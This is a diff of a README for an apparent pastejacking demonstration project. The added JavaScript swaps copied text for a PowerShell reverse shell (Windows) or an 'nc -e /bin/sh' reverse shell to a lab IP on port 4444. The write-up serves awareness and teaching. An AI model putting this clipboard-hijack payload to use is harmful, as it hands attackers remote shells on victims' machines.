@@ -19,18 +19,41 @@ Pastejacking is a technique that manipulates the clipboard content of a user, le
 
 In this project, a simple webpage was created using HTML. This webpage presented users with a block of code that they could copy and execute in their terminal. However, the actual content copied to the clipboard included additional code that spawned a reverse shell. This is the essence of pastejacking - what you see is not always what you get.
 
+An important feature of the webpage is its ability to identify the operating system of the user's machine. This allows the malicious code to be tailored to the specific system, increasing the likelihood of successful exploitation. For the purposes of this project, the target system was chosen to be Windows.
+
 The process can be broken down into the following steps:
 
 1. **Creating the Webpage**: A simple webpage was created with a block of seemingly innocuous code that users are prompted to copy. This could be presented as a solution to a common problem, enticing users to copy the code.
 
+![Web Page](images/Web_Page.png)
+
 2. **Implementing Pastejacking**: Through the use of JavaScript, the actual content that gets copied is manipulated. When users copy the code, additional malicious code is appended or prepended. In this case, the additional code spawns a reverse shell when pasted into the terminal.
+
+```js
+$('#copyButton').on('click', function(e) {
+            var original = $('#code').text();
+            var appended;
+            if(navigator.platform.indexOf("Win") !=-1) {
+                
+                appended = original + '; Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient(\'10.0.2.15\',4444);
+                                                                  $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+                                                                  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+                                                                      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                                                                      $sendback = (iex $data 2>&1 | Out-String );
+                                                                      $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';
+                                                                      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                                                                      $stream.Write($sendbyte,0,$sendbyte.Length);
+                                                                      $stream.Flush()};
+                                                                  $client.Close();  }; ';
+            } else {
+
+                appended = 'nc - e /bin/sh 10.0.2.15 4444; ' + original;
+            }
+```
 
 3. **Executing the Malicious Code**: The user, believing they have copied the visible code, pastes the content into their terminal and executes it. This not only runs the expected commands but also the hidden malicious code.
 
 4. **Spawning the Reverse Shell**: The malicious code opens a reverse shell, providing a backdoor into the user's system.
 
-![Web Page](images/Web_Page.png)
-
-(Note: Insert code snippet of the JavaScript used for pastejacking here)
 
 This demonstration serves as a reminder of the potential dangers of copying code from untrusted sources and executing it in the terminal. It emphasizes the importance of understanding the code you're executing and using trusted sources.
